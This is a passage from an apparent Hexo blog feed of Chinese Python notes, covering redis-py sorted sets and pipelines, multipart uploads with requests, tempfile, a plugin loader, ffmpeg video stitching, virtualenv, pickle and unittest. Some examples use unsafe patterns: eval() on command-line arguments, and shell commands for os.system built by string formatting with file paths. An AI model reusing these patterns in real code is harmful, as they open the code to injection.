start, end, withscores=False, score_cast_func=float)print(r.zrevrange(&quot;zset1&quot;, 0, -1))    # 只获取元素，不显示分数print(r.zrevrange(&quot;zset1&quot;, 0, -1, withscores=True)) # 获取有序集合中所有元素和分数,分数倒序3-2 按照分数范围获取name对应的有序集合的元素zrangebyscore(name, min, max, start=None, num=None, withscores=False, score_cast_func=float)for i in range(1, 30):   element = &#39;n&#39; + str(i)   r.zadd(&quot;zset3&quot;, element, i)print(r.zrangebyscore(&quot;zset3&quot;, 15, 25)) # # 在分数是15-25之间，取出符合条件的元素print(r.zrangebyscore(&quot;zset3&quot;, 12, 22, withscores=True))    # 在分数是12-22之间，取出符合条件的元素（带分数）3-3 按照分数范围获取有序集合的元素并排序（默认从大到小排序）zrevrangebyscore(name, max, min, start=None, num=None, withscores=False, score_cast_func=float)print(r.zrevrangebyscore(&quot;zset3&quot;, 22, 11, withscores=True)) # 在分数是22-11之间，取出符合条件的元素 按照分数倒序3-4 获取所有元素--默认按照分数顺序排序zscan(name, cursor=0, match=None, count=None, score_cast_func=float)print(r.zscan(&quot;zset3&quot;))3-5 获取所有元素--迭代器zscan_iter(name, match=None, count=None,score_cast_func=float)for i in r.zscan_iter(&quot;zset3&quot;): # 遍历迭代器    print(i)</code></pre><pre><code>4.zcount(name, min, max)获取name对应的有序集合中分数 在 [min,max] 之间的个数print(r.zrange(&quot;zset3&quot;, 0, -1, withscores=True))print(r.zcount(&quot;zset3&quot;, 11, 22))</code></pre><pre><code>5.自增zincrby(name, value, amount)自增name对应的有序集合的 name 对应的分数r.zincrby(&quot;zset3&quot;, &quot;n2&quot;, amount=2)    # 每次将n2的分数自增2print(r.zrange(&quot;zset3&quot;, 0, -1, withscores=True))</code></pre><pre><code>6.获取值的索引号zrank(name, value)获取某个值在 name对应的有序集合中的索引（从 0 开始）更多：zrevrank(name, value)，从大到小排序print(r.zrank(&quot;zset3&quot;, &quot;n1&quot;))   # n1的索引号是0 这里按照分数顺序（从小到大）print(r.zrank(&quot;zset3&quot;, &quot;n6&quot;))   # n6的索引号是1print(r.zrevrank(&quot;zset3&quot;, &quot;n1&quot;))    # n1的索引号是29 这里安照分数倒序（从大到小）</code></pre><pre><code>7.删除--指定值删除zrem(name, values)删除name对应的有序集合中值是values的成员r.zrem(&quot;zset3&quot;, &quot;n3&quot;)   # 删除有序集合中的元素n3 删除单个print(r.zrange(&quot;zset3&quot;, 0, -1))</code></pre><pre><code>8.删除--根据排行范围删除，按照索引号来删除zremrangebyrank(name, min, max)根据排行范围删除r.zremrangebyrank(&quot;zset3&quot;, 0, 1)  # 删除有序集合中的索引号是0, 1的元素print(r.zrange(&quot;zset3&quot;, 0, -1))</code></pre><pre><code>9.删除--根据分数范围删除zremrangebyscore(name, min, max)根据分数范围删除r.zremrangebyscore(&quot;zset3&quot;, 11, 22)   # 删除有序集合中的分数是11-22的元素print(r.zrange(&quot;zset3&quot;, 0, -1))</code></pre><pre><code>10.获取值对应的分数zscore(name, value)获取name对应有序集合中 value 对应的分数print(r.zscore(&quot;zset3&quot;, &quot;n27&quot;))   # 获取元素n27对应的分数27</code></pre><h1 id="8、其他常用操作"><a href="#8、其他常用操作" class="headerlink" title="8、其他常用操作"></a>8、其他常用操作</h1><pre><code>1.删除delete(*names)根据删除redis中的任意数据类型（string、hash、list、set、有序set）r.delete(&quot;gender&quot;)  # 删除key为gender的键值对</code></pre><pre><code>2.检查名字是否存在exists(name)检测redis的name是否存在，存在就是True，False 不存在print(r.exists(&quot;zset1&quot;))</code></pre><pre><code>3.模糊匹配keys(pattern=&#39;&#39;)根据模型获取redis的name更多：KEYS * 匹配数据库中所有 key 。KEYS h?llo 匹配 hello ， hallo 和 hxllo 等。KEYS hllo 匹配 hllo 和 heeeeello 等。KEYS h[ae]llo 匹配 hello 和 hallo ，但不匹配 hilloprint(r.keys(&quot;foo*&quot;))</code></pre><pre><code>4.设置超时时间expire(name ,time)为某个redis的某个name设置超时时间r.lpush(&quot;list5&quot;, 11, 22)r.expire(&quot;list5&quot;, time=3)print(r.lrange(&quot;list5&quot;, 0, -1))time.sleep(3)print(r.lrange(&quot;list5&quot;, 0, -1))</code></pre><pre><code>5.重命名rename(src, dst)对redis的name重命名r.lpush(&quot;list5&quot;, 11, 22)r.rename(&quot;list5&quot;, &quot;list5-1&quot;)</code></pre><pre><code>6.随机获取namerandomkey()随机获取一个redis的name（不删除）print(r.randomkey())</code></pre><pre><code>7.获取类型type(name)获取name对应值的类型print(r.type(&quot;set1&quot;))print(r.type(&quot;hash2&quot;))</code></pre><pre><code>8.查看所有元素scan(cursor=0, match=None, count=None)print(r.hscan(&quot;hash2&quot;))print(r.sscan(&quot;set3&quot;))print(r.zscan(&quot;zset2&quot;))print(r.getrange(&quot;foo1&quot;, 0, -1))print(r.lrange(&quot;list2&quot;, 0, -1))print(r.smembers(&quot;set3&quot;))print(r.zrange(&quot;zset3&quot;, 0, -1))print(r.hgetall(&quot;hash1&quot;))</code></pre><pre><code>9.查看所有元素--迭代器scan_iter(match=None, count=None)for i in r.hscan_iter(&quot;hash1&quot;):    print(i)for i in r.sscan_iter(&quot;set3&quot;):    print(i)for i in r.zscan_iter(&quot;zset3&quot;):    print(i)</code></pre><h1 id="other-方法"><a href="#other-方法" class="headerlink" title="other 方法"></a>other 方法</h1><pre><code>print(r.get(&#39;name&#39;))    # 查询key为name的值r.delete(&quot;gender&quot;)  # 删除key为gender的键值对print(r.keys()) # 查询所有的Keyprint(r.dbsize())   # 当前redis包含多少条数据r.save()    # 执行&quot;检查点&quot;操作，将数据写回磁盘。保存时阻塞# r.flushdb()        # 清空r中的所有数据</code></pre><h1 id="管道（pipeline）"><a href="#管道（pipeline）" class="headerlink" title="管道（pipeline）"></a>管道（pipeline）</h1><blockquote><p>redis默认在执行每次请求都会创建（连接池申请连接）和断开（归还连接池）一次连接操作，<br>如果想要在一次请求中指定多个命令，则可以使用pipline实现一次请求指定多个命令，并且默认情况下一次pipline 是原子性操作。</p></blockquote><blockquote><p>管道（pipeline）是redis在提供单个请求中缓冲多条服务器命令的基类的子类。<br>它通过减少服务器-客户端之间反复的TCP数据库包，从而大大提高了执行批量命令的功能。</p></blockquote><pre><code>import redisimport timepool = redis.ConnectionPool(host=&#39;localhost&#39;, port=6379, decode_responses=True)r = redis.Redis(connection_pool=pool)# 默认的情况下，管道里执行的命令可以保证执行的原子性，执行pipe = r.pipeline(transaction=False)可以禁用这一特性。# pipe = r.pipeline(transaction=False)# pipe = r.pipeline(transaction=True)pipe = r.pipeline() # 创建一个管道pipe.set(&#39;name&#39;, &#39;jack&#39;)pipe.set(&#39;role&#39;, &#39;sb&#39;)pipe.sadd(&#39;faz&#39;, &#39;baz&#39;)pipe.incr(&#39;num&#39;)    # 如果num不存在则vaule为1，如果存在，则value自增1pipe.execute()print(r.get(&quot;name&quot;))print(r.get(&quot;role&quot;))print(r.get(&quot;num&quot;))</code></pre><p>管道的命令可以写在一起，如：</p><pre><code>pipe.set(&#39;hello&#39;, &#39;redis&#39;).sadd(&#39;faz&#39;, &#39;baz&#39;).incr(&#39;num&#39;).execute()print(r.get(&quot;name&quot;))print(r.get(&quot;role&quot;))print(r.get(&quot;num&quot;))</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py requests.md</title>
      <link href="/2019/11/30/deploy/python/libs/py%20requests/"/>
      <url>/2019/11/30/deploy/python/libs/py%20requests/</url>
      
        <content type="html"><![CDATA[<h2 id="使用requests和requests-toolbelt上传文件"><a href="#使用requests和requests-toolbelt上传文件" class="headerlink" title="使用requests和requests_toolbelt上传文件"></a>使用requests和requests_toolbelt上传文件</h2><p><a href="https://blog.csdn.net/summerpowerz/article/details/80293235" target="_blank" rel="noopener">https://blog.csdn.net/summerpowerz/article/details/80293235</a></p><p>模拟浏览器上传表单</p><p>例子1</p><pre><code class="python">import timeimport datetimeimport hashlibimport osimport randomimport sysimport requestsimport jsonfrom requests_toolbelt.multipart.encoder import MultipartEncoderurl = &#39;http://XXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#39;headers = {    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0&#39;,    &#39;Referer&#39;: url}multipart_encoder = MultipartEncoder(    fields = {        &#39;save_name&#39;: &#39;test.txt&#39;,        &#39;save_data&#39;: (&#39;test.txt&#39;, open(&#39;test.txt&#39;, &#39;rb&#39;), &#39;application/octet-stream&#39;)    },    boundary = &#39;-----------------------------&#39; + str(random.randint(1e28, 1e29 - 1)))headers[&#39;Content-Type&#39;] = multipart_encoder.content_type#请求头必须包含一个特殊的头信息，类似于Content-Type: multipart/form-data; boundary=${bound}responseStr = requests.post(url, data=multipart_encoder, headers=headers)print(responseStr.text)</code></pre><p>例子2</p><pre><code class="python">import os, random, sys, requestsfrom requests_toolbelt.multipart.encoder import MultipartEncoderurl = &#39;http://127.0.0.1/sendmsg&#39;argvstr = sys.argv[1:]argv_dict = {}for argv in argvstr :    argv = str(argv).replace(&quot;\r\n&quot; , &quot;&quot;)    DICT = eval(argv)    argv_dict.update(DICT)headers = {    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0&#39;,    &#39;Referer&#39;: url    }multipart_encoder = MultipartEncoder(    fields={        &#39;username&#39;: argv_dict[&#39;username&#39;],        &#39;pwd&#39;: argv_dict[&#39;pwd&#39;],        &#39;type&#39;: &#39;txt&#39;,        &#39;friendfield&#39;: argv_dict[&#39;friendfield&#39;],        &#39;friend&#39;: argv_dict[&#39;friend&#39;],        &#39;content&#39;: argv_dict[&#39;content&#39;],        &#39;file&#39;: (os.path.basename(argv_dict[&#39;file&#39;]) , open(argv_dict[&#39;file&#39;], &#39;rb&#39;), &#39;application/octet-stream&#39;)        #file为路径        },        boundary=&#39;-----------------------------&#39; + str(random.randint(1e28, 1e29 - 1))    )headers[&#39;Content-Type&#39;] = multipart_encoder.content_type#请求头必须包含一个特殊的头信息，类似于Content-Type: multipart/form-data; boundary=${bound}r = requests.post(url, data=multipart_encoder, headers=headers)print(r.text)#注意，不要设置cookies等其他参数，否则会报错# 例子/usr/local/python36/bin/python3 /opt/lykchat/test_upload.py &quot;{&#39;username&#39;:&#39;lykchat&#39;,&#39;pwd&#39;:&#39;123456&#39;,&#39;type&#39;:&#39;img&#39;,&#39;friendfield&#39;:&#39;1&#39;,&#39;friend&#39;:&#39;xxxx&#39;,&#39;content&#39;:&#39;恭喜发财&#39;,&#39;file&#39;:&#39;/root/b.jpg&#39;}&quot;#等同于curl -F &quot;file=@/root/a&quot; &#39;http://127.0.0.1/sendmsg?username=lykchat&amp;pwd=123456&amp;type=img&amp;friendfield=1&amp;friend=xxxx&amp;content=恭喜发财&#39;</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py tmpfile.md</title>
      <link href="/2019/11/30/deploy/python/libs/py%20tmpfile/"/>
      <url>/2019/11/30/deploy/python/libs/py%20tmpfile/</url>
      
        <content type="html"><![CDATA[<p>用于创建临时文件或者临时文件夹</p><pre><code class="python">import tempfile# 创建临时文件def test_mkstemp():    # 说明：该方法仅仅创建一个临时文件；返回包含两个元素的元组，    # 第一个元素指操作该临时文件的安全级别，第二个元素指该临时文件的路径    file = tempfile.mkstemp(suffix=&quot;.txt&quot;, prefix=&quot;tmp&quot;, dir=&quot;./tmp&quot;, text=True)    print(file)    with open(file[0], &quot;w+&quot;) as f:        f.write(&quot;aaa\nbbb&quot;)        f.seek(0)        print(f.readlines())def test_TemporaryFile():    # 说明：该方法返回一个文件对象用于临时数据保存，它没有文件名字，你也找不到它所在的位置；    # 当文件对象被close或者被del的时候，临时文件将从磁盘上删除。    temp = tempfile.TemporaryFile()  # 参数同上    try:        print(&#39;temp:&#39;, temp)        print(&#39;temp.name:&#39;, temp.name)        # 写入        temp.write(b&quot;hello world\n&quot;)        temp.seek(0)        # 读取        print(&#39;temp.read:&#39;, temp.read())    finally:        # 自动清除文件        temp.close()def test_NamedTemporaryFile():    # 说明：同tempfile.TemporaryFile类似，主要区别就是多了个delete参数，    # 用于指定文件对象close或者被del之后，是否也一同删除磁盘上的临时文件    # （当delete = True的时候，即默认的时候行为与TemporaryFile一样）。    temp = tempfile.NamedTemporaryFile(suffix=&#39;.sh&#39;, prefix=&#39;script_&#39;, dir=&#39;/tmp&#39;)    try:        temp.write(b&#39;aaaa\n&#39;)        # 指定从什么位置写入        temp.seek(0)        print(temp.read())    finally:        # 自动清除文件，因为delete参数默认是True        temp.close()# seek有三种写入模式：seek(offset,where): where=0从起始位置移动，1从当前位置移动，2从结束位置移动。def test_SpooledTemporaryFile():    # 将 BytesIO或者StringIO转换成临时文件    file = tempfile.SpooledTemporaryFile()    file.write(b&quot;asdasdasd&quot;)    file.seek(0)    print(file.read())def test_mkdtemp():    path = tempfile.mkdtemp(&quot;tmptmp&quot;)    print(path)  # 要手动处理文件夹删除</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py plugin_pattern.md</title>
      <link href="/2019/11/30/deploy/python/design_patterns/py%20plugin_pattern/"/>
      <url>/2019/11/30/deploy/python/design_patterns/py%20plugin_pattern/</url>
      
        <content type="html"><![CDATA[<p>插件模式： 可扩展更多功能，继承指定的类实现特定方法</p><p>Plugin1</p><pre><code class="python">class A(object):    def __init__(self):        pass    def process(self):        print(&#39;Plugin1&#39;)a = Nonedef b():    pass</code></pre><p>Plugin2</p><pre><code class="python">class A(object):    def __init__(self):        pass    def process(self):        print(&#39;Plugin2&#39;)</code></pre><p>TestPlugin</p><pre><code class="python"># coding: utf8import os# 找到Plugins中所有插件名称def getPlugin():    path = os.path.split(os.path.realpath(__file__))[0]    plugins = os.listdir(path + &#39;/Plugins/&#39;)    fil = lambda str: (True, False)[str[-3:] == &#39;pyc&#39; or str.find(&#39;__init__.py&#39;) != -1]    return filter(fil, plugins)if __name__ == &quot;__main__&quot;:    # 遍历所有插件    for plugin in getPlugin():        # Get Plugin File Name        pluginName = os.path.splitext(plugin)[0]        # Load Plugin        plugin = __import__(&quot;Plugins.&quot; + pluginName, fromlist=[pluginName])        myplugin = getattr(plugin, &quot;A&quot;)        # Get Plugin Object        p = myplugin()        # Invoke Plugin Method        p.process()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> design_patterns </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py alipay.md</title>
      <link href="/2019/11/30/deploy/python/libs/py%20alipay/"/>
      <url>/2019/11/30/deploy/python/libs/py%20alipay/</url>
      
        <content type="html"><![CDATA[<h2 id="支付宝py包依赖过时"><a href="#支付宝py包依赖过时" class="headerlink" title="支付宝py包依赖过时"></a>支付宝py包依赖过时</h2><p>参考： <a href="https://jingyan.baidu.com/article/67508eb47b864a9cca1ce48f.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/67508eb47b864a9cca1ce48f.html</a></p><blockquote><p>解决<br>pycrypto过时三年，使用PyCryptodome替代，<br>通过修改了alipay_sdk_python-3.2.53-py3-none-any中的包依赖，替换后安装成功</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ffmpeg视频拼接.md</title>
      <link href="/2019/11/30/deploy/others/ffmpeg%E8%A7%86%E9%A2%91%E6%8B%BC%E6%8E%A5/"/>
      <url>/2019/11/30/deploy/others/ffmpeg%E8%A7%86%E9%A2%91%E6%8B%BC%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<p>视频拼接参考： <a href="https://www.jianshu.com/p/98a0c091c4bf" target="_blank" rel="noopener">https://www.jianshu.com/p/98a0c091c4bf</a><br>ffmpeg下载： <a href="http://ffmpeg.org/" target="_blank" rel="noopener">http://ffmpeg.org/</a><br>拼接参考： <a href="https://blog.csdn.net/east196/article/details/79821361" target="_blank" rel="noopener">https://blog.csdn.net/east196/article/details/79821361</a></p><pre><code class="python">import osimport tempfiledef get_temp_file(self, data, suffix=None):  # 传入缓存路径，数据，文件后缀例如 &quot;.txt&quot;    &quot;&quot;&quot;临时文件，需要close, tmp_file_obj.close()&quot;&quot;&quot;    if not os.path.exists(self.tempfile_tmp_path):        os.makedirs(self.tempfile_tmp_path)    tmp_file_obj = tempfile.NamedTemporaryFile(suffix=suffix, dir=self.tempfile_tmp_path)    tmp_file_obj.write(data)    tmp_file_obj.seek(0)    return tmp_file_obj</code></pre><pre><code>import osimport shutilimport threadingimport uuidclass DataUtils(object):    def __init__(self, storage_path=&quot;/data/report&quot;):        # 文件存储路径        self.storage_path = storage_path        # 缓存路径        self.tmp_path = os.path.join(storage_path, &quot;tmp/&quot;).replace(&quot;\\&quot;, &quot;/&quot;)    def save_data(self, task_id, device_id, file_obj, path=None):        &quot;&quot;&quot;保存文件，同名覆盖.        path传入绝对路径的话只有path生效，相对路径的话，path会添加到file_path后面        &quot;&quot;&quot;        file_path = os.path.join(self.storage_path, task_id, device_id).replace(&quot;\\&quot;, &quot;/&quot;)        file_name = file_obj.name.replace(&quot;\\&quot;, &quot;/&quot;).split(&quot;/&quot;)[-1]        if path:            dir_name = os.path.dirname(path)            base_name = os.path.basename(path)            if dir_name:                file_path = os.path.join(file_path, dir_name).replace(&quot;\\&quot;, &quot;/&quot;)            if base_name:                file_name = base_name        if not os.path.exists(file_path):            os.makedirs(file_path)        dst_path = os.path.join(file_path, file_name).replace(&quot;\\&quot;, &quot;/&quot;)        # 保存        if &#39;b&#39; in file_obj.mode:            with open(dst_path, &quot;wb&quot;) as f:                f.write(file_obj.read())                return        with open(dst_path, &quot;w&quot;) as f:            f.write(file_obj.read())    def async_save_data(self, task_id, device_id, file_obj, path=None):        threading.Thread(target=self.save_data, args=(task_id, device_id, file_obj, path)).start()    def stitching_video_mp4(self, task_id, device_id, video_path=None, dst_path=&quot;video.mp4&quot;):        &quot;&quot;&quot;将目录下多个mp4视频拼接成一个,系统需要安装ffmpeg，并加入环境变量        video_path 要合并的视频所在目录，        dst_path传入绝对路径的话只有dst_path生效，相对路径的话，dst_path会添加到file_path后面        &quot;&quot;&quot;        if not dst_path.endswith(&#39;.mp4&#39;):            raise RuntimeError(&quot;dst_path，目标路径必须以 &#39;.mp4&#39; 结尾&quot;)        if not video_path:            video_path = os.path.join(self.storage_path, task_id, device_id, &#39;video&#39;).replace(&quot;\\&quot;, &quot;/&quot;)  # 视频源默认目录        else:            video_path = video_path.replace(&#39;\\&#39;, &#39;/&#39;)        # 目录不存在就返回        if not os.path.exists(video_path) or not os.path.isdir(video_path):            raise RuntimeError(&quot;video_path 参数路径不存在或者不是目录: &quot; + str(video_path))        video_list = []        for name in os.listdir(video_path):            if name.endswith(&quot;.mp4&quot;):                video_list.append(name.split(&#39;.&#39;)[0])        # 没有 mp4 就返回        if not video_list:            return        if not os.path.exists(self.tmp_path):  # 检查 tmp 目录是否存在            os.makedirs(self.tmp_path)        tmp_output_path = os.path.join(self.tmp_path, str(uuid.uuid1()) + &#39;.mp4&#39;).replace(&quot;\\&quot;, &quot;/&quot;)  # 临时video文件路径        cmd_ts = &quot;echo y | ffmpeg -i %s -vcodec copy -acodec copy -vbsf h264_mp4toannexb %s&quot;        cmd_out = &#39;echo y | ffmpeg -i &quot;concat:%s&quot; -acodec copy -vcodec copy -absf aac_adtstoasc %s&#39;        video_list.sort()  # 视频拼接顺序        src_list = []        out_ts_list = []        for video_name in video_list:            src_path = os.path.join(video_path, video_name + &quot;.mp4&quot;).replace(&quot;\\&quot;, &quot;/&quot;)            ts_path = os.path.join(video_path, video_name + &quot;.ts&quot;).replace(&quot;\\&quot;, &quot;/&quot;)            get_ts = cmd_ts % (src_path, ts_path)            os.system(get_ts)            src_list.append(src_path)            out_ts_list.append(ts_path)        get_out = cmd_out % (&quot;|&quot;.join(out_ts_list), tmp_output_path)  # 生成临时video文件        os.system(get_out)        for ts in out_ts_list:  # 删除中间文件            os.remove(ts)        if os.path.exists(tmp_output_path):  # 临时文件存在            # 拼接后的文件生成了才可以删除源文件，但是相同目录存在同名文件的情况不能处理，应对cmd异常。            for ts in src_list:                os.remove(ts)  # 删除源目录文件            output_path = os.path.join(video_path, os.path.dirname(dst_path)).replace(&quot;\\&quot;, &quot;/&quot;)  # 存储目录路径            if not os.path.exists(output_path):  # 创建目标路径                os.makedirs(output_path)            output_path = os.path.join(output_path, os.path.basename(dst_path)).replace(&quot;\\&quot;, &quot;/&quot;)  # 存储文件路径            # 移动到目标路径            shutil.move(tmp_output_path, output_path)            # return output_path        # return None    def async_stitching_video_mp4(self, task_id, device_id, video_path=None, dst_path=&quot;video.mp4&quot;):        threading.Thread(target=self.stitching_video_mp4, args=(task_id, device_id, video_path, dst_path)).start()</code></pre>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py 虚拟环境.md</title>
      <link href="/2019/11/30/deploy/python/py%20%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"/>
      <url>/2019/11/30/deploy/python/py%20%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h1 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h1><h2 id="win下"><a href="#win下" class="headerlink" title="win下"></a>win下</h2><ol><li>先新建文件夹python_ven_demo，</li><li>然后进入该文件夹cd python_ven_demo，</li><li>然后搭建虚拟环境：python -m venv . （注：venv 之后一个空格加上一点“.”)</li></ol><p>或者</p><ol><li>在桌面上直接建立虚拟环境文件夹 及 虚拟环境：直接输入 python -m venv python_ven_demo (虚拟环境文件夹名，直接在桌面建立了文件夹，同时生成了虚拟环境）</li></ol><blockquote><p>激活方式：dos 界面进入python_ven_demo/Script，然后输入activate.bat (也可直接输入activate）即可激活环境</p></blockquote><blockquote><p>退出方式：输入deactivate.bat 或 deactivate</p></blockquote><h2 id="linux下"><a href="#linux下" class="headerlink" title="linux下"></a>linux下</h2><ol><li>建立虚拟环境方法相同，进入目标文件夹cd desktop<br>使用python -m venv python_ven_demo</li><li>新建文件夹python_ven_demo，进入 cd python_ven_demo，然后python -m venv .</li></ol><blockquote><p>激活方法和windos不同，activate文件在bin文件夹下，而是需要使用<br>source activate 命令：<br>退出方式： deactivate</p></blockquote><blockquote><ol start="3"><li>包安装<br>激活后，输入python2，可进入python2.7环境，输入python3，可进入python3.6环境<br>pip install 可安装2.7对应的包，pip3可安装3.6对应的包</li></ol></blockquote><h1 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h1><blockquote><p>virtualenvwrapper在virtualenv的基础上提供了一些更方便的命令。</p></blockquote><pre><code># 安装sudo pip install virtualenvsudo pip install virtualenvwrapper</code></pre><pre><code># 在~/.bashrc里面加上export WORKON_HOME=/home/dev/virtualenv  #你创建的虚拟环境所放置的目录source /usr/local/bin/virtualenvwrapper.sh# source ~/.bashrc</code></pre><pre><code>mkvirtualenv -p python3 py3env</code></pre><ul><li>-p 后面的参数指定python解释器，不写使用系统默认</li><li>py3env 指定目录</li></ul><pre><code>deactivate # 退出当前虚拟环境workon [虚拟环境名称] # 使用某个虚拟环境rmvirtualenv [虚拟环境名称] # 删除某个虚拟环境lsvirtualenv# 列出所有虚拟环境</code></pre><pre><code>pip freeze -l &gt; packages.txtpip install -r packages.txt</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py pickle.md</title>
      <link href="/2019/11/30/deploy/python/libs/py%20pickle/"/>
      <url>/2019/11/30/deploy/python/libs/py%20pickle/</url>
      
        <content type="html"><![CDATA[<p><a href="https://docs.python.org/3/library/pickle.html" target="_blank" rel="noopener">官方文档</a></p><pre><code class="python"># !/usr/bin/env python# -*- coding: utf-8 -*-import pickle# dumps(objuect)将对象序列化lista = [&quot;aaa&quot;, &quot;bbb&quot;, &quot;ccc&quot;]listb = pickle.dumps(lista)# print listb# loads(string)将对象原样恢复，并且对象类型也恢复为原来的格式listc = pickle.loads(listb)print(listc)# dump(objuect,file),将对象存储到文件里面序列化groupl = (&quot;rrr&quot;, &quot;sss&quot;, &quot;www&quot;)f1 = open(&#39;1.pk1&#39;, &#39;wb&#39;)pickle.dump(groupl, f1, True)f1.close()# load(object, file)将dump()存储在文件里面的数据恢复f2 = open(&#39;1.pk1&#39;, &#39;rb&#39;)t = pickle.load(f2)print (t)f2.close()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py unittest.md</title>
      <link href="/2019/11/30/deploy/python/libs/py%20unittest/"/>
      <url>/2019/11/30/deploy/python/libs/py%20unittest/</url>
      
        <content type="html"><![CDATA[<p><a href="https://docs.pytest.org/en/latest/getting-started.html#install-pytest" target="_blank" rel="noopener">附另一个测试框架 pytest 官网</a></p><p>Pyhon工作原理—— 核心概念：test case, testsuite, TestLoder,TextTestRunner,TextTestResult, test fixture</p><ul><li>TestCase（测试用例）: 所有测试用例的基类，它是软件 测试中最基本的组成单元。<br>  (一个test case就是一个测试用例，是一个完整的测试流程，包括测试前环境的搭建setUp，执行测试代码(run)，以及测试后环境的还原(tearDown)。测试用例是一个完整的测试单元，可以对某一问题进行验证。)</li><li>TestSuite（测试套件）:多个测试用例test case集合就是TestSuite，TestSuite可以嵌套TestSuite</li><li>TestLoder：是用来加载 TestCase到TestSuite中，其中有几个loadTestsFrom_()方法，就是从各个地方寻找TestCase，创建他们的实例，然后add到TestSuite中，再返回一个TestSuite实例</li><li>TextTestRunner：是来执行测试用例的，其中的run（test）会执行TestSuite/TestCase中的run(result)方法。</li><li>TextTestResult：测试结果会保存到TextTestResult实例中，包括运行了多少用例，成功与失败多少等信息</li><li>TestFixture:又叫测试脚手，测试代码的运行环境，指测试准备前和执行后要做的工作，包括setUp和tearDown方法</li></ul><pre><code class="python"># file: handlerdef get_add(a, b):    return a + bdef get_max(a, b):    return a if a &gt; b else bdef get_min(a, b):    return a if a &lt; b else b</code></pre><pre><code class="python"># coding: utf8# file: test_handlerimport unittestfrom handler import get_add, get_max, get_min# 在第一行给出了每一个用例执行的结果的标识，# 成功是 .，失败是 F，出错是 E，跳过是 S# 测试的执行跟方法的顺序没有关系class TestHandler(unittest.TestCase):    # setUpClass()与tearDownClass()     # 在所有case执行之前准备一次环境，并在所有case执行结束后再清理环境    # 注意：@classmethod必须加，否则报错    @classmethod    def setUpClass(cls):        print(&#39;This setUpClass() method only called once\n&#39;)    @classmethod    def tearDownClass(cls):        print(&#39;This tearDownClass() method only called once too\n&#39;)    # setUp， tearDown 两个方法在每个测试方法执行前以及执行后执行一次    # setUp用来为测试准备环境，tearDown用来清理环境，已备之后的测试    def setUp(self):        print(&#39;do something before test&#39;)    def tearDown(self):        print(&#39;do something after test&#39;)    # 每个测试方法均以 test 开头，否则是不被unittest识别的    def test_add(self):        print(&quot;test_add&quot;)        self.assertEqual(5, get_add(2, 3))        self.assertNotEqual(3, get_add(2, 3))    # 跳过某个case    # @unittest.skip(&quot;no reason&quot;)    # @unittest.skipIf(1, u&quot;为True时跳过&quot;)    # @unittest.skipUnless(0, u&quot;为False时跳过&quot;)    def test_max(self):        print(&quot;test_max&quot;)        self.assertEqual(3, get_max(2, 3))    def test_min(self):        print(&quot;test_min&quot;)        self.assertEqual(2, get_min(2, 3))def fun1():    # 直接用 addTests 方法添加 TestCase 列表，确定 case 执行顺序    suite = unittest.TestSuite()    tests = [TestHandler(&quot;test_min&quot;), TestHandler(&quot;test_add&quot;), TestHandler(&quot;test_max&quot;)]    suite.addTests(tests)    runner = unittest.TextTestRunner(verbosity=2)    runner.run(suite)def fun2():    # 直接用 addTest 方法添加单个 TestCase, 确定 case 执行顺序    suite = unittest.TestSuite()    suite.addTest(TestHandler(&quot;test_min&quot;))    suite.addTest(TestHandler(&quot;test_max&quot;))    runner = unittest.TextTestRunner(verbosity=1)    runner.run(suite)def fun3():    # 用 addTests + TestLoader， 加载多个模块（文件），确定文件执行顺序    suite = unittest.TestSuite()    suite.addTests(unittest.TestLoader().loadTestsFromName(&quot;test_handler.TestHandler&quot;))    # 添加多个    # suite.addTests(unittest.TestLoader().loadTestsFromNames([&quot;test_handler.TestHandler&quot;]))    runner = unittest.TextTestRunner(verbosity=1)    runner.run(suite)def fun4():    # 用 loadTestsFromTestCase 方法传入 TestCase 名称即可, 确定类执行顺序    suite = unittest.TestSuite()    suite.addTests(unittest.TestLoader().loadTestsFromTestCase(TestHandler))    runner = unittest.TextTestRunner(verbosity=1)    runner.run(suite)def fun5():    # 结果输出到文件    suite = unittest.TestSuite()    tests = [TestHandler(&quot;test_min&quot;), TestHandler(&quot;test_add&quot;), TestHandler(&quot;test_max&quot;)]    suite.addTests(tests)    with open(&quot;result.txt&quot;, &quot;a&quot;) as f:        runner = unittest.TextTestRunner(stream=f, verbosity=2)        runner.run(suite)if __name__ == &quot;__main__&quot;:    # 在unittest.main()中加 verbosity 参数可以控制输出的错误报告的详细程度，是    # 1，默认值    # 0，则不输出每一用例的执行结果，即没有上面的结果中的第1行    # 2，则输出详细的执行结果    # unittest.main(verbosity=1)    fun5()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py pil.md</title>
